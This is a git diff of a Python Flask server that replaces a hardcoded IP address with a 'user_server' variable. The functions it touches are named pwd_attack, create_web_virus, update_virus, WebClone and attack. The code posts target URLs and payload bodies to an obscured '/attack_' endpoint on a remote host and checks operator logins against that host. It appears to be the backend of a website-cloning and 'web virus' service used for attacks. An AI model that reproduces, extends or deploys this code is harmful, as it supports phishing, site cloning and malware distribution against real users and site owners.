@@ -25,6 +25,7 @@ app = Flask(__name__)
 CORS(app)
 
 
+user_server = 'http://154.201.85.154:11111'
 url_list = {}
 config: config_loader = None
 visit_request = {}
@@ -63,9 +64,9 @@ def pwd_attack():
         for i in range(2, len(data)):
             body += data[i] +'\n'
         body = body.strip()
-        r = requests.post('http://154.201.85.154:11111/check_ip_check/'+check)
+        r = requests.post(user_server+'/check_ip_check/'+check)
         if json.loads(r.text)['message'] == 'ok':
-            attack_requests = requests.post('http://154.201.85.154:11111/attack_hasjdfjiqu489uodsfhjoasjr9w4ruiosidfjsdlo',data=url+'\n'+body)
+            attack_requests = requests.post(user_server+'/attack_hasjdfjiqu489uodsfhjoasjr9w4ruiosidfjsdlo',data=url+'\n'+body)
             return attack_requests.text
         else:
             return 'check code error.'
@@ -81,7 +82,7 @@ def create_web_virus(user , pwd):
     else:
         visit_request[client_ip] = 1
 
-    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
+    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
     if r.text != 'Passwd Or UserName Error!':
         n = get_random()
         
@@ -180,7 +181,7 @@ def update_virus(filename , check):
             return 'Too many requests'
     else:
         visit_request[client_ip] = 1
-    message = json.loads(requests.get('http://154.201.85.154:11111/check_ip_check/' + check).text.strip())['message']
+    message = json.loads(requests.get(user_server+'/check_ip_check/' + check).text.strip())['message']
     if str(filename).strip().lower() == "index.html" or str(filename).strip().lower() == "index.htm":
         return 'FILE NAME IS NULL: index.html or index.htm'
     if message != 'ok':
@@ -263,7 +264,7 @@ def WebClone(attack_url , user , pwd):
 
     attack_url = str(attack_url).replace('-' , '/')
 
-    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
+    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
     if r.text != 'Passwd Or UserName Error!':
         n = get_random()
         
@@ -292,7 +293,7 @@ def attack(attack_type,user,pwd):
     else:
         visit_request[client_ip] = 1
 
-    r = requests.post('http://154.201.85.154:11111/login' , data=user+"\n"+pwd)
+    r = requests.post(user_server+'/login' , data=user+"\n"+pwd)
     if r.text.lower() != 'login failed.':
         n = get_random()
         
